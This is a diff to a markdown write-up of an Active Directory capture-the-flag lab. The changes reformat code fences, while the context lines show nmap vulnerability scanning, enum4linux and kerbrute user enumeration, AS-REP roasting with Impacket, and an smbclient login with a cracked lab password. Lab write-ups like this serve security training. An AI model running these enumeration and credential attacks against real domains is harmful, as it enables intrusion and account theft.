@@ -10,7 +10,8 @@ sudo nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.
 
 This gives us the following results.
 
-```Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198
+```
+# Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198
 Pre-scan script results:
 |_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
 Increasing send delay for 10.10.177.198 from 0 to 5 due to 2065 out of 5162 dropped probes since last increase.
@@ -104,7 +105,8 @@ enum4linux 10.10.177.198
 
 This produces a lot of noise (I've all of the output to STDERR below) as the target is fairly locked down. But there's a few interesting things here.
 
-```enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021
+```
+enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021
  ========================== 
 |    Target Information    |
  ========================== 
@@ -436,7 +438,7 @@ kerbrute userenum --dc 10.10.177.198 --domain spookysec.local --output attacktiv
 
 This produces the following output.
 
-```Kerbrute user enumeration output
+```
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
@@ -473,7 +475,7 @@ We'll be targeting the `svc-admin` and `backup` accounts. (These are supposed to
 
 We're going to try [AS-REP Roasting](kerberos.md) using [Impacket](impacket.md)'s GetNPUsers.py script. We first create an `attacktive-directory.targets` file containing the following:
 
-```Users of interest
+```
 svc-admin
 backup
 ```
@@ -513,7 +515,7 @@ smbclient -L THM-AD -I 10.10.177.198 -U svc-admin%management2005
 
 Which gives us the following output.
 
-```smbclient output for 10.10.177.198 as svc-admin%management2005
+```
         Sharename       Type      Comment
         ---------       ----      -------
         ADMIN$          Disk      Remote Admin
